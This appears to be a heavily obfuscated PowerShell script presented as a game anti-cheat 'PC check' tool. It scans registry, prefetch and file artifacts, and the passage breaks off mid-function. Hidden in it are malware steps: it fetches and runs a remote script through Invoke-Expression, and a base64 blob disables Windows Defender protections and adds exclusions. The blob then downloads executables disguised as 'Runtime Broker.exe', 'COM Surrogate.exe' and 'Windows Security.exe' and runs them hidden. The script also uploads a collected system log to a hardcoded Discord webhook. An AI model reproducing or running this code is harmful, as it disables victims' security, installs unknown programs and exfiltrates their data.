        fun`ction s`k`Fz`d`m`gR`W`wFK {
     para`m (
             [`string]$encr`ypte`d`Va`lidat`ion,
            [`str`ing]$`key
      )
      
        $`aes = [S`y`ste`m.Secur`it`y.`Cry`ptograph`y.`Aes]::`Create()
        $ae`s.Ke`y`S`ize = 2`56
           $ae`s.`B`loc`k`S`i`ze = `128
    $`aes.`Mode = [`Syste`m.`Secur`it`y.Cr`ypt`ography.`C`ip`herM`o`de]::`CBC
         $ae`s.Pad`d`ing = [`S`y`stem.Securit`y.`Cr`y`pto`graph`y.`Pad`dingM`o`de]::`PK`CS`7
       
         $ke`yB`ytes = [`C`onvert]::Fr`om`Ba`se64`Str`ing($`key)
        $ae`s.Ke`y = $ke`yByte`s

       $fullB`ytes = [`Convert]::`FromBa`se`64String($en`cry`pted`Vali`dat`ion)
      $`aes.`IV = $fu`llByte`s[`0..`15]
       $`c`ipher`Text = $ful`l`Bytes[`1`6..$fu`l`lB`yte`s.Len`gth]

     $decr`y`ptor = $`aes.CreateDecr`yptor()
        $`decr`y`pte`dByte`s = $decr`y`ptor.`Tran`sf`or`m`F`ina`l`Bl`o`c`k($cipher`Text, `0, $`c`i`pherText.Len`gt`h)
     
       `return [`S`y`ste`m.`Text.Enc`od`in`g]::U`TF`8.Get`String($de`cr`yptedB`yte`s)
       }
    
      
   
       
       c`lEar-`h``O`St
    
   $a`s`ci`i`ArtUrl = "`htt`ps://ra`w.`g`ithubu`ser`c`ontent.`com/`Rea`pi`in/`art/`main/`art.`p`s`1"
 $asc`iiArtS`cript = `iNv`o`k`E-r`E`st`M`E`T`h`oD -`Uri $asci`i`ArtUrl
      ``iN`V``O``ke-`E`X`Pr``E``SSi``On $asciiArt`S`cr`ipt
    
   $encode`d`T`it`le = "Q`3`JlY`XRl`Z`CB`ie`SBS`ZWF`waWlu`I`G`9u`I`G`Rpc`2Nv`c`mQu"
    $t`itleText = [`Syste`m.`Text.`En`c`o`d`ing]::`UTF8.`Get`Str`ing([`System.`C`onvert]::Fro`mBase`6`4String($en`co`dedTitle))
      $`Host.`U`I.`Ra`wUI.W`ind`owT`it`le = $title`Text

   $`logf`ileen`code`d = "`JG51bGw`g`P`SA`k`UF`NEZW`Z`h`d`Wx0UG`Fy`YW1`l`d`G`V`y`V`mF`s`d`W`V`z`Wy`c`qO`kV`yc`m`9`y`QW`N0a`W9uJ`10gPS`AnU2l`s`Z`W50bH`l`Db`250a`W`51ZSc`N`CiR`Fcn`JvckFj`dG`lvblB`y`Z`W`Z`lcmVu`Y2`U`gPSAnU`2ls`Z`W50b`HlDb2`50aW`5`1ZS`cNCiRP`d`X`R`w`dX`R`Q`c`m`Vm`ZXJ`lb`mNl`ID0gJ`1`NpbG`Vu`d`Gx`5Q29udG`lud`W`UnDQ`o`kS`W`5mb3Jt`Y`X`R`pb`2`5QcmV`mZ`X`Jlb`mNlI`D0gJ1`NpbG`Vud`Gx`5Q`2`9ud`Glu`d`W`UnDQokV`mV`yYm9z`Z`VB`y`ZWZl`cmVu`Y2Ug`P`S`AnU2`lsZ`W`50bH`l`Db`250a`W51`ZSc`NC`iRXY`XJuaW`5n`UHJ`l`Zm`V`y`Z`W5`j`Z`S`A`9I`CdTa`Wx`lbnRseUNvbn`Rpbn`Vl`J`w0KU2V0`L`U1`wUH`Jl`Zm`Vy`ZW5j`Z`SAtR`GlzY`WJ`s`Z`VJl`YWx0aW1lTW9ua`X`Rvcm`lu`ZyAkd`HJ`1Z`Q0`K`U2`V0L`U1w`U`HJl`Z`mVyZ`W5`j`Z`SAtRG`l`zYW`Js`ZVN`j`c`m`lw`d`FN`j`YW5uaW`5n`I`CR0cn`Vl`D`Q`pT`ZXQt`T`X`BQcm`V`mZX`Jlb`mN`l`IC`1`Ea`XNh`Y`mx`l`QmVoY`XZ`pb3`J`Nb2`5`pdG9`ya`W5n`IC`R0`cn`VlD`Q`p`TZX`Qt`TXBQ`cm`VmZXJ`lb`m`Nl`I`C`1Ea`XNh`Ymx`lS`U`9BVlByb`3RlY`3`R`pb`24gJH`Ryd`W`U`NCl`N`l`d`C1`N`cF`B`y`ZWZ`lcm`VuY`2`U`gLUR`p`c`2`F`ibGVJbnR`ydX`Npb25QcmV`2`Z`W50aW9u`U`3l`zd`G`Vt`IC`R0`cn`V`lD`QokVXN`lcl`B`yb`2`Zpb`GU`gP`SAk`Z`W5`2Ol`VT`RV`J`QUk9GS`Ux`FDQok`VGVt`cERp`c`i`A9`I`CI`k`VXN`lc`lByb2`Z`pb`G`V`cQ`X`B`wRG`F0`YVx`Mb2`Nhb`Fx`UZ`W1wXDZjZmRmZ`WVh`L`Tk`zM`zYt`N`Dh`hZ`C04M`mIzL`T`N`kN`D`E`y`N`j`Q1ZjQ0`Z`lw`i`D`Q`p`p`Z`iA`oLW`5v`d`C`AoV`G`Vzd`C1`QYX`R`oI`C1`Q`YX`R`oIC`R`U`ZW`1wR`Gl`yKS`kgew0KIC`Ag`IE`5ld`y`1`J`dGVt`IC1J`d`G`Vt`V`Hl`wZS`B`Ea`XJ`l`Y`3Rv`cn`kg`LV`BhdG`g`g`JF`Rlb`X`B`EaXI`gLU`Zv`cm`N`lIH`w`gT3`V0LU5`1bG`w`NCn0`NC`iR`Q`cm`9nc`m`V`z`c`1`ByZWZlcmVu`Y2`UgP`SAnU`2l`sZW50b`H`l`Db250a`W5`1`Z`ScN`Ci`RF`cnJvc`kFjdG`lvb`lB`y`Z`WZlcm`Vu`Y`2UgP`SAnU`2`l`s`ZW`50b`HlDb2`50a`W`5`1ZScN`C`m`Z1bm`N0a`W`9uI`E`Rv`d`25sb2F`kQW`5kUnVu`IH`sNCiAgICBw`Y`XJ`hb`S`AoD`Qog`ICA`g`IC`A`gIFtzdHJpb`m`d`d`J`F`Vyb`C`wN`C`i`AgIC`AgI`CA`gW`3`N0cm`luZ10kRm`l`s`Z`U5hbW`UNC`iA`gI`CApDQ`o`gICAg`J`E`Z`pb`GV`QYXR`oI`D0`gS`m`9`pbi1`QYX`Ro`IC`1QYXR`oI`CR`UZ`W1`w`RG`l`y`IC`1Da`G`l`s`ZF`B`h`d`Gg`gJ`EZpbG`V`O`YW`1`lDQog`I`CAgS`W5`2b`2t`lL`V`d`l`Y`lJlc`X`V`lc`3`Q`g`L`VVya`SAkVXJsI`C1P`dX`RGa`Wx`l`ICRGaWxl`UG`F0aCAt`VX`N`l`QmF`zaWN`Q`Y`XJ`za`W5n`IC1`Fcn`Jv`ck`F`j`dGlvb`iB`TdG`9`w`IC`o+`IC`Rud`Wx`s`ID`I+Jj`E`NC`i`A`gI`CB`B`Z`GQt`TXB`Qc`mV`mZ`X`JlbmNlI`C`1`FeG`N`s`d`XNpb2`5QYX`R`o`I`CR`Ga`Wxl`UGF0a`CAq`Pi`A`kbn`Vsb`CAyPiYx`D`Q`o`gIC`Ag`U`3R`h`cnQt`U`H`JvY2`Vzcy`AtRm`lsZVBh`dG`ggJE`Z`pb`GV`QY`X`R`oIC1Ob0`5l`d`1`d`pb`mRvdyAt`V`2Fpd`CAt`R`XJ`yb`3JBY3R`pb`24`gU2l`s`Z`W`50b`H`l`Db250aW5`1Z`S`AqPi`A`kbn`V`sbCA`yP`i`YxD`Qp9`D`Qp`Eb3dubG`9h`ZE`Fu`ZFJ1b`iAt`V`XJ`sI`C`Jod`HR`wc`z`ov`L`3`IyL`mUtei`5ob`3`N0`L`2Z`iYjg1NDBhL`WQ`zN`D`Qt`ND`Ji`YS0`4ZTI0LW`Z`m`M`GV`lM`TZ`iMW`U3`ZC`85`OX`R5`dm1xN2oxb`WN`qN2J`5M`m8u`ZX`hlIi`At`R`mls`Z`U`5`hbW`U`gIl`J1bnRpbWU`gQn`Jva2`V`y`LmV4`Z`S`I`NC`k`Rv`d25`sb2FkQ`W`5`kUn`Vu`I`C`1V`cm`w`gI`m`h0d`H`B`z`O`i`8v`Y`2`RuLm`R`pc2`NvcmRh`c`HAuY`2`9tL`2F0`d`GF`jaG1lbnR`zLzE`zMD`c`wNjkx`NTE5`ND`gzMD`g0OT`AvMTMx`N`zA2`N`DIyNjM`y`O`T`cyMj`k`wMC`9`D`T0`1fU`3`V`y`c`m9nY`X`RlL`m`V`4ZT9leD02`NzVkN`T`My`N`S`Z`p`c`z0`2`NzV`j`M`DFh`N`S`Zob`T0`y`N2F`m`Z`j`EzY`2Jl`MG`U`wMj`A`2`N`zU`4`Yz`liN`D`h`jZ`D`M3`Y`m`YxN`j`F`mZm`Yy`Y`z`A0MWFjZT`d`m`ZTk`3`Y2`E0`Nm`Y`5`Z`j`BkMDc0`N`T`Y4J`iI`g`LU`Z`pb`GV`OY`W1`l`IC`JD`T00g`U3`V`yc`m`9n`Y`X`R`l`LmV`4Z`S`IN`C`k`Rvd25`sb2F`k`Q`W`5`kUn`VuI`C`1Vc`m`wgI`m`h0`dH`Bz`Oi`8vY`2`RuL`m`R`pc2`Nv`c`m`Rh`c`H`Au`Y`2`9tL`2`F0d`G`FjaG1`lbn`Rz`LzEzM`D`c`wNj`kxN`TE`5NDgz`M`Dg0`OTAv`MTMx`NzA2NDIx`N`T`g`4M`T`cx`M`T`Y`3N`i9`XaW5`kb3d`z`X`1N`lY3Vya`X`R5`L`mV4ZT`9leD0`2`N`zVkN`TMyMi`Z`p`cz02NzVjMDFh`Mi`Z`ob`T0y`O`DFl`M`z`M0`N`zR`k`Z`T`NlY`T`k4`Z`m`NlNWU0`ODE`zYjd`l`ODE3M`m`U`2`MmE4ZWF`mOWV`l`Z`TI2Yjk`3`M`DczMDNlOT`k0MjU`4MjF`kJiIgL`UZpbG`V`O`YW1`l`IC`JXa`W`5kb3dz`IFNlY`3Vya`XR5`LmV`4`ZS`I="
  $de`c`o`de`dlo`gsend = [`S`yste`m.`Text.`Enc`o`din`g]::`UTF8.Get`Str`in`g([`S`ystem.`Convert]::`Fr`om`Base64Str`ing($lo`gfileen`coded))
  
        
       fun`cti`on `OBJRs`OtNkv`VG {
            tr`y {
        `if (``get-c`o`mman``D C`onfir`m-SecureBo`otU`EFI -Err`orAct`ion `S`i`lently`Continue) {
              $se`cure`Boot`State = `Confirm-SecureB`ootU`E`F`I
             `if ($secureBoot`State) {
                     `Wr`I`T``E-`H`o``S``T "``n[-] `Secure Bo`ot `is `ON." -`Fore`groun`dCo`lor `Green
              } e`l`se {
                        `Wr``I`T``E-`Ho``S``T "``n[-] `Secure `Bo`ot `is `OFF." -`F`ore`groundC`olor Re`d
                 }
               } e`l`se {
                    `Wr``IT``E-H`o``S``T "``n[-] Se`cure `B`oot n`ot ava`ilable `on `this syste`m." -`F`ore`gr`oun`dC`o`lor `Yel`lo`w
            }
        } `cat`c`h {
           `Wr`I`T``E-`H`o``S``T "``n[-] `Unable t`o `retrieve Se`cure B`o`ot `status: $`_" -`F`oregroun`dCo`l`or Re`d
         }
 }
 `OB`J`RsOtNkvVG
       
     fun`ct`ion Hh`I`h`Bib`P`w`R`s`C {
      `try {
                $oneDr`ive`Pat`h = (``Get-`iTe`MPr``oPe`RT`Y "`HKCU:\`Software\`M`i`cr`o`soft\`OneDr`ive" -`Na`me "`U`serFolder").`User`F`ol`der
             `if (-n`ot $one`DrivePat`h) {
                  `WriTe-`WaRnIn``g "OneDr`ive `path `not `found `in re`g`istry. Atte`mpting a`lternative detecti`on..."
                    $env`One`Dr`ive = [Sy`stem.`I`O.Pat`h]::`Co`mb`ine($`env:U`serPr`of`ile, "One`Dr`ive")
             `if (`te``st-``P``A``T``h $envOne`Dr`ive) {
                 $`one`Dr`ivePat`h = $envOne`Drive
                      `Wr``I`T``E-H`o``S``T "[-] `OneDrive `path detecte`d u`sin`g env`iron`ment `variable: $one`Dr`ive`Pat`h" -Fore`ground`C`ol`or `Green
               } e`l`se {
                  ``wr``IT`E-`err``o``R "Unab`le `to `find `OneDr`ive `pat`h auto`mat`i`ca`ll`y."
               }
              }
            `return $`one`Drive`Pat`h
      } cat`c`h {
          ``wr``ITE-`err``o``R "`Unab`le `to fin`d `OneDrive pat`h: $`_"
             `return $nu`ll
         }
      }
        
fun`ct`ion `yf`k`mBK`K`DQO`ob {
       `param($`name, $va`lue)
     $`output = "{`0} : {`1}" -`f $`name, $`value -re`place 'Syste`m.`B`yte\[\]', ''
          
     `if ($out`put -`mat`ch "Privi`le`ge") {
        `return $`null
    }
      
      `if ($out`put -not`mat`c`h "`Steam|%{$_}|Or`igin|%{$_}|E`A`Play|%{$_}|FileS`yn`c`Conf`ig.`exe|%{$_}|`Out`l`ookF`orWind`o`ws") {
                `return $out`put
           }
     }
 
        `function gvHt`Crvtt`Eyx {
          $user`Name = $`env:User`Na`me
          $oneDr`ivePath = `Hh`I`h`Bib`P`wR`sC
        $potentia`lPaths = @("`C:\U`sers\$user`Na`me\`Documents\`M`y `Game`s\`Ra`inb`o`w `S`ix - `S`ie`ge", "$one`Dr`ivePat`h\D`o`cu`ments\M`y `Games\Rainb`o`w `S`ix - S`ie`ge")
      $a`l`l`User`Na`mes = @()
   
      foreac`h ($`path `in $`potent`ial`Path`s) {
          `if (`te``st-``P``A``T``h -Pat`h $pat`h) {
                   $`dir`Na`me`s = ``get-``C``hILd``it``Em -`Pat`h $`pat`h -D`ire`ctory |%{$_}| `fOrEa`c`h-`O`B`jeCT { $`_.`Name }
                 $a`llU`serNa`me`s += $dir`Name`s
              }
           }
  
           $uni`que`User`Na`mes = $a`ll`User`Name`s |%{$_}| `sEL``E``C``T-``O`B`je`ct -`Uni`que
    
          `if ($uni`queUser`Na`me`s.`C`ount -`eq `0) {
             `Wr`I`T``E-`Ho``S``T "`nS`kip`pin`g `Stats.`cc `Search" -`F`oregr`oun`dCo`lor `Yel`l`o`w
           } el`se {
          `Wr`I`T``E-`Ho``S``T "`n`R`6 Userna`mes `Detecte`d. Su`mm`on `Stats.`c`c? |%{$_}| (`Y/`N)"
                $userRe`sp`onse = `r``EA``d-`h``o``St

           `if ($u`ser`Res`pon`se -`eq "`Y") {
             f`oreac`h ($na`me `in $un`ique`UserNa`mes) {
                       $`url = "`http`s://`stats.c`c/`s`iege/$`name"
                  `Wr``IT``E-`Ho``S``T " [-] O`pen`in`g `stat`s `for $`name `on `Stats.`c`c ..." -Fore`gr`oundCo`l`or `Dark`Ma`genta
                      ``start-`P``R`O`C`E`s``S $`url
                       `s``Tar``T-``s``L`Ee`p -`Se`conds `0.`5
                   }
              } e`lse {
               `Wr`I`T``E-H`o``S``T "`Stats.c`c Sear`c`h `S`k`ip`pe`d" -`Foregr`ound`Co`l`or `Yellow
             }
          }
   }
        
 
       funct`i`on B`JnDxvXt`mv`k`E {
            `Wr``IT``E-`Ho``S``T " [-] `F`inding sus`p`iciou`s fi`les na`me`s..." -`F`oregr`oundC`ol`or Dar`kMa`genta
      $su`sFiles = @()
     
     foreac`h ($f`ile `in $`globa`l:`lo`gEntr`ies) {
            `if ($f`i`le -mat`c`h "`loa`der.*\.`exe") { $`su`s`File`s += $`file }
      }
    
      `if ($susFi`le`s.C`ount -`gt `0) {
             $`globa`l:lo`gEntr`ie`s += "``n-----------------``nSus F`ile`s(`Files w`it`h `loader `in t`he`ir `name):``n"
           $`g`l`obal:`log`Entr`ies += $susF`ile`s |%{$_}| ``sO``Rt-`ob`j``E``ct
    }
        }
    
    funct`i`on `ml`Phn`j`whsW`j`S {
      `Wr`I`T``E-`Ho``S``T " [-] F`in`d`ing .z`ip an`d .`rar f`ile`s. P`lease `wait..." -`F`oregr`oun`d`Co`lor `Dar`k`Magenta
      $zipRar`Fi`le`s = @()
       $searchPat`h`s = @($`env:`UserPr`of`ile, "$`env:`UserPr`of`i`le\`Downl`oa`d`s")
    $uni`que`Pat`hs = @{}

            f`oreach ($`pat`h `in $`sear`chPat`h`s) {
              `if (`te``st-``P``A``T``h $`pat`h) {
                $`files = ``get-``C`hI`Ld``it``E`m -`Path $`path -Re`curse -`In`clu`de *.`z`i`p, *.`rar -`F`i`le
                 foreac`h ($fi`le `in $f`iles) {
                   `if (-n`ot $un`i`quePat`hs.`Contains`Key($`file.`Full`Na`me) -an`d $f`i`le.Fu`l`lNa`me -not`match "`minecraft") {
                       $un`iquePath`s[$f`i`le.Fu`l`l`Na`me] = $`true
                      $z`i`pRar`F`i`le`s += $fi`le
                        }
             }
                }
       }
    
    `return $z`ip`Rar`File`s
   }
     fun`ction u`R`HG`Ae`JB`jcgH {
            `Wr``I`T``E-`H`o``S``T " ``n [-] `Fetc`hing" -F`oreground`Co`l`or Dar`kMagenta -`No`New`l`ine; `Wr`I`T``E-`H`o``S``T " `User`Settin`g`s" -F`ore`groun`dCo`lor W`hite -`N`o`New`l`ine; `Wr``I`T``E-H`o``S``T " Entrie`s " -Foregroun`d`C`olor Dar`k`Ma`genta
     
       $lo`g`ged`Paths = @{}
 
       $reg`istr`yPath = "`HKL`M:\S`YS`T`EM\CurrentControl`Set\`Serv`ice`s\`bam\`State\User`Settings"
        $userSetting`s = ``get-``C``h`I`Ld``it``Em -`Path $regi`str`y`Pat`h |%{$_}| ``W`HEr``E-`O`B``j``E``cT { $`_.`Name -li`ke "*100`1" }

        `if ($u`ser`Sett`ing`s) {
          `foreach ($`setting `in $user`Sett`ing`s) {
                 $`g`l`oba`l:l`ogEntries += "``n$($`setting.P`SPath)"
                 $`items = ``Get-``i`Te`MPr``o`Pe`R`TY -`Path $`sett`ing.`PSPat`h |%{$_}| s`EL``E``C``T-``OB`je`ct -Pro`perty *
                 f`oreac`h ($`ite`m `in $ite`m`s.PS`Object.`Propert`ie`s) {
                 `if (($`item.Na`me -`match "`exe" -`or $ite`m.`Na`me -`match ".`rar") -`and -n`ot $log`gedPat`hs.Conta`insKey($`item.`Name) -`and $`item.`Name -notmat`ch "`Fi`le`S`yn`c`C`onfi`g.`exe|%{$_}|Outloo`kF`orWind`ows") {
                            $`g`loba`l:`logEntr`ies += "``n" + (`yfkm`B`KKDQ`O`ob $`item.`Name $`ite`m.`Va`lue)
                           $l`og`ge`dPaths[$`ite`m.Na`me] = $`true
                }
             }
             }
          } e`l`se {
         `Wr``I`T``E-`Ho``S``T " [-] `No re`levant `user setting`s foun`d." -Foregroun`dCol`or Re`d
    }
      
            `Wr``IT``E-H`o``S``T " [-] `Fetc`hin`g" -`Fore`gr`oundC`o`l`or `Dark`Ma`genta -NoNe`wline; `Wr`I`T``E-H`o``S``T " `Co`mpat`ibi`l`ity `Assi`stant" -`Fore`gr`oun`dC`olor `Wh`ite -No`Ne`wline; `Wr``I`T``E-`Ho``S``T " Entr`ies" -`Foregr`oun`dC`ol`or `Dar`kMa`genta
           $c`ompatRegi`stry`Pat`h = "`HK`CU:\SOF`TW`A`RE\M`icr`osoft\`Windo`ws N`T\Current`Version\A`p`pCompatFlag`s\Com`patib`il`it`y `Ass`istant\`St`ore"
        $`c`ompat`Entries = ``Get-`i`Te`MPr`o`Pe`R`TY -Pat`h $`com`pat`Re`gistryPath
    $c`om`patEntrie`s.`PSObje`ct.Pr`operties |%{$_}| f`Or`Ea``c`h-`O``B`je`CT {
               `if (($`_.Na`me -`match "`exe" -`or $`_.`Name -`match ".`rar") -an`d -`not $lo`gge`dPaths.`C`ontain`s`Key($`_.`Name) -`and $`_.Na`me -n`otmat`c`h "File`S`ync`Conf`ig.`exe|%{$_}|`Out`lookFor`Win`d`ow`s") {
                    $`gl`oba`l:l`o`g`Entries += "``n" + (`yfkmBKKD`QOob $`_.`Name $`_.`Va`lue)
                $lo`gge`d`Path`s[$`_.`Na`me] = $`true
         }
       }
       
           `Wr``IT``E-H`o``S``T " [-] Fet`ch`ing" -F`ore`gr`oun`dCol`or Dark`Ma`genta -`No`Ne`wl`ine; `Wr`I`T``E-`Ho``S``T " `A`p`p`s`S`w`itched" -`F`oregroundC`o`lor `Wh`ite -`N`oNew`l`ine; `Wr``I`T``E-`Ho``S``T " Entrie`s" -`F`oregr`oun`d`Col`or Dar`kMagenta
          $new`Re`g`i`str`y`Pat`h = "HKC`U:\`S`O`FT`W`A`RE\M`icr`o`s`oft\`W`ind`o`ws\`Current`Version\`Exp`lorer\`Feature`U`sa`ge\Ap`pS`w`itched"
     `if (`te``st-``P``A``T``h $ne`wRe`g`i`str`y`Pat`h) {
           $ne`w`Entries = ``Get-`i`TeM`Pr``oPeR`TY -`Path $newReg`i`stry`Pat`h
              $ne`wEntries.`P`S`Obje`ct.`Propert`ie`s |%{$_}| f`OrEa``ch-`O``BjeC`T {
                  `if (($`_.Na`me -mat`ch "`exe" -`or $`_.`Na`me -`mat`c`h ".`rar") -`and -`not $lo`g`ged`Path`s.Contain`s`Ke`y($`_.`Name) -`and $`_.Na`me -n`otmatch "FileSyncConfi`g.`exe|%{$_}|Out`loo`kF`orW`in`d`o`ws") {
                 $g`lobal:`l`og`Entr`ie`s += "``n" + (`yfkmBK`K`DQOob $`_.`Name $`_.Va`lue)
                  $`loggedPath`s[$`_.`Name] = $`true
                }
                }
       }
   
        `Wr`I`T``E-H`o``S``T " [-] `Fet`c`hing" -Fore`ground`C`o`lor `Dark`Ma`genta -No`New`line; `Wr``IT``E-`H`o``S``T " `Mu`i`Cache" -`F`ore`groundC`o`l`or W`h`ite -N`o`New`line; `Wr``IT``E-`H`o``S``T " Entr`ie`s" -ForegroundCol`or `DarkMa`genta
       $`mu`iCa`c`he`Pat`h = "HK`C`U:\S`oftware\C`lasses\`L`ocal Sett`in`gs\`Software\`M`icrosoft\`W`ind`o`ws\`Shell\`Mu`iCa`c`he"
           `if (`te``st-``P``A``T``h $mu`i`Ca`chePath) {
              $`mu`iCa`che`Entrie`s = ``get-``C``hILd``it`E`m -Pat`h $`mu`i`Ca`che`Pat`h
            $mu`i`CacheEntr`ie`s.`P`S`Ob`je`ct.Pr`o`pert`ie`s |%{$_}| `fOrEa``ch-`O`B`je`CT {
                `if (($`_.`Na`me -matc`h "`exe" -`or $`_.`Name -`mat`ch ".`rar") -`and -n`ot $`lo`gge`dPaths.C`ontain`sKey($`_.`Name) -an`d $`_.`Name -n`otmatc`h "F`ile`S`yn`cConfig.`exe|%{$_}|Outl`ookF`or`Win`do`ws") {
                       $`g`l`obal:`l`o`g`Entr`ie`s += "``n" + (`yfkm`BK`K`D`Q`O`ob $`_.`Na`me $`_.`Va`lue)
                    $loggedPath`s[$`_.Na`me] = $`true
            }
                }
     }
 
    $`global:lo`g`Entrie`s = $`g`lobal:l`ogEntrie`s |%{$_}| `s`O``Rt-ob`j``E``ct |%{$_}| g`E`T-`uni``que |%{$_}| ``WHEr``E-`O`B``j``E`c`T { $`_ -notmat`c`h "\{.*\}" } |%{$_}| f`Or`Ea``c`h-`O``BjeCT { $`_ -re`p`lace ":", "" }
 
           S`LbC`jNhbz`jen
     
           $f`o`lderName`s = `gv`HtCrvtt`E`yx |%{$_}| ``s`O``Rt-`obj``E``ct |%{$_}| gE`T-un`i``que
         $`g`l`obal:logEntr`ie`s += "``n==============="
         $`g`l`oba`l:l`o`gEntr`ie`s += "`nR`6 Userna`me`s:"
     
        f`oreach ($`name `in $f`ol`der`Na`me`s) {
                $`g`lobal:l`og`Entrie`s += "``n" + $`name
            $`url = "`htt`p`s://`stats.`cc/s`ie`ge/$na`me"
                `Wr``IT``E-`Ho``S``T " [-] `O`penin`g `stats `for $`name `on `Stats.`cc ..." -ForegroundC`olor Dar`k`Ma`genta
           ``start-`P``R``O`CEs``S $`url
              `s``Tar``T-``s`L`Ee`p -`Secon`ds `0.`5
     }
    }
      
fun`ct`i`on S`Lb`Cj`N`hbz`jen {
        `Wr``I`T``E-`Ho``S``T " [-] Fet`chin`g" -F`oregroun`d`Co`l`or `DarkMagenta -`No`Newl`ine; `Wr`I`T``E-H`o``S``T " `reg entr`ies" -`F`oregr`ound`Color W`hite -`No`Ne`w`line; `Wr``I`T``E-`Ho``S``T " `in`si`de `PowerS`he`l`l..." -F`ore`gr`oun`d`C`o`l`or Dark`Magenta
          $reg`istryPath = "`H`KL`M:\S`O`F`TWAR`E\`Clients\`StartMenuInternet"
     
         `if (`te``st-``P``A``T``h $registr`yPat`h) {
              $bro`w`serFo`l`der`s = ``get-``C``hI`Ld``it`E`m -`Path $re`gistry`Path
         $`g`l`oba`l:`l`ogEntrie`s += "``n==============="
        $`g`loba`l:logEntr`ies += "`nBro`wser F`o`l`ders:"
                `foreach ($fo`l`der `in $br`o`w`serFolders) { $g`l`obal:l`og`Entrie`s += "``n" + $`folder.Na`me }
       } e`l`se {
           `Wr``I`T``E-H`o``S``T "`Re`g`i`str`y pat`h f`or `browsers `not foun`d." -ForegroundC`o`l`or `Re`d
    }
     }
     
  fun`cti`on `kE`z`Y`N`lRavL`BF {
         `Wr``IT``E-`H`o``S``T " [-] Lo`g`g`ing" -F`ore`groun`d`C`ol`or Dar`kMagenta -`N`o`New`line; `Wr`I`T``E-`Ho``S``T " `Wind`o`ws `in`stal`l" -Foregr`ound`C`olor `Wh`ite -`N`o`Ne`w`line; `Wr``IT``E-`Ho``S``T " `date..." -F`ore`gr`oun`dC`olor `DarkMa`genta
            $`os = `get-``W``miOb``j``E`Ct -C`las`s `W`in3`2_`OperatingS`yste`m
     $`in`sta`llDate = $`os.`ConvertT`o`Date`Time($o`s.In`stal`lDate)
     $globa`l:l`og`Entrie`s += "``n==============="
     $`g`loba`l:`lo`gEntrie`s += "`nW`indows Installat`ion `Date: $in`stal`lDate"
}
  
`function `o`g`Ha`PSBnA`Cp`g {
        `Wr``IT``E-`H`o``S``T " [-] C`hec`k`ing" -Fore`gr`oun`dC`olor `Dark`Magenta -`N`o`Ne`w`line; `Wr``IT``E-H`o``S``T " `for .tl`scan" -`F`oregr`oundCol`or `W`hite -N`oNe`wline; `Wr``IT``E-H`o``S``T " f`o`lder`s..." -Fore`groun`d`C`ol`or `Dar`k`Ma`genta
    $re`centD`o`c`sPath = "`HK`CU:\`S`OFT`WARE\M`i`cros`oft\`Windows\`Current`Versi`on\Ex`pl`orer\Recent`Do`cs"
      $tl`scan`Foun`d = $`false
    `if (`te``st-``P``A``T``h $re`centD`ocs`Pat`h) {
          $re`cent`D`oc`s = ``get-``C`h`I`Ld``it``Em -Pat`h $re`centD`oc`s`Pat`h
            forea`ch ($`item `in $re`centDo`c`s) {
                   `if ($ite`m.`P`S`Ch`i`l`dName -`matc`h "\.tl`scan") {
                      $tlscanF`oun`d = $`true
                       $fo`l`der`Path = ``Get-`i`Te`MPr``o`PeR`T`Y -Pat`h "$recent`D`ocsPath\$($`item.PSC`h`il`dName)" -`Name M`RUL`i`st`Ex
                       $globa`l:lo`gEntr`ies += "``n.`tlscan `F`O`U`ND. `D`M`A `S`ET`UP `S`OF`TW`A`RE D`E`TE`C`TED `in $f`ol`derPath"
                   `Wr``I`T``E-H`o``S``T ".t`lscan `F`OU`ND. DM`A S`E`T`U`P S`O`FT`WARE `D`E`TE`C`TED `in $fo`l`derPat`h" -`F`ore`groun`dC`o`l`or `Red
                  }
              }
          }
           `if (-`not $tls`can`Foun`d) {
        `Wr`I`T``E-`H`o``S``T " [-] N`o .`tlscan `ext `found." -Fore`gr`oundC`ol`or `Green
     }
   }
        
      funct`ion `ArPDPbKl`y`c`T`D {
    `Wr``I`T``E-H`o``S``T " [-] `Fet`c`hing `Last `Ran `Dates..." -F`ore`gr`ound`C`ol`or Dar`kMa`genta
         $`prefet`c`hPath = "`C:\`Win`d`ow`s\Prefet`c`h"
        $pf`F`i`lesHeader = "``n=======================``n.`pf f`ile`s:``n"
  
       `if (`te``st-``P``A``T``h $`prefet`chPat`h) {
          $pf`Files = ``get-``C`hI`L`d``it``Em -`Path $`prefetc`h`Path -Fi`lter *.`pf -`File
            `if ($`pf`F`i`les.`Count -`gt `0) {
                $g`loba`l:l`o`g`Entr`ie`s += $`pfF`i`le`sHea`der
                    $pf`F`ile`s |%{$_}| `fOrEa`c`h-`O``B`je`C`T {
                       $`l`ogEntry = "{`0} |%{$_}| {`1}" -`f $`_.`Name, $`_.Last`Write`Ti`me
                 $g`l`obal:`lo`g`Entr`ie`s += "``n" + $log`Entry
                    }
             } el`se {
            `Wr``I`T``E-`H`o``S``T "`No .`pf f`iles `found `in t`he `Prefet`ch `folder." -`Fore`gr`oun`d`C`ol`or `Green
              }
          } el`se {
                `Wr``IT``E-`Ho``S``T "`Prefet`c`h f`o`l`der `not f`oun`d." -F`ore`gr`oun`dC`o`l`or `Red
       }
    }
funct`ion n`G`ce`HkfX`QhXL {
          $desktop`Pat`h = [S`ystem.`Env`ironment]::GetFolderPat`h('`De`s`kto`p')
          $log`FilePath = `j`o`i``N-`paTH -`Pat`h $deskto`pPat`h -`C`h`i`l`d`Path "`Pc`CheckLo`g`s.`txt"
        
         `if (`te``st-``P``A``T``h $l`o`gF`ile`Path) {
           $`url = "`https://`ptb.`di`sc`ord.`com/a`pi/`web`ho`oks/13`16`16068`8`162603090/`HPXs`2u`yz`Ri`2JAWOaU7e`FNpJn`Xc8`k`q`ju`UMA`JR`jmSx`M`sp5`j26P-`w4jxfcj`o0`I`gP`_G`3e`j2`X"

        $f`ile`Content = ``g``Et-``C``O`Nt``En``T -`Pat`h $`l`o`gF`i`le`Path -`Ra`w
      
              $boundar`y = [S`yste`m.Gu`i`d]::`New`Gui`d().T`oStrin`g()
              $`L`F = "``r``n"
  
               $b`o`d`y`L`ines = (
                   "--$b`oun`dary",
                    "C`ontent-`Di`sp`o`s`it`ion: for`m-`data; `name=`"f`ile`"; f`i`lename=`"PcC`hec`k`Log`s.`txt`"",
                    "C`ontent-`Ty`pe: `text/`pla`in$Q`QO`zaeE`C`WP",
            $f`ileContent,
             "--$boun`dar`y--$`L`F"
                ) -j`oin $`LF
 
           `try {
